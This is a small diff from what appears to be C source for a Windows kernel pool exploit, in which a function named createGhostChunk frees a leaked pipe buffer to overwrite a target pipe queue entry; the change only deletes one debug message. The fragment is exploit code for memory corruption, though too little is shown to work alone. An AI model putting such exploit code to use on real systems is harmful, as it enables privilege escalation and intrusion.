@@ -152,7 +152,6 @@ int createGhostChunk(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
         return 0;
     }
 
-    puts("[*] Freeing the leaked pipe to overwrite the target pipe queue entry");
     char dummy_buf[0x1000];
     FreeNPPNxChunk(&pipes->fake_pool_header->pipes[leaking_pipe_idx], pipes->fake_pool_header->bufsize);
     ClosePipePairHandles(&pipes->fake_pool_header->pipes[leaking_pipe_idx]);
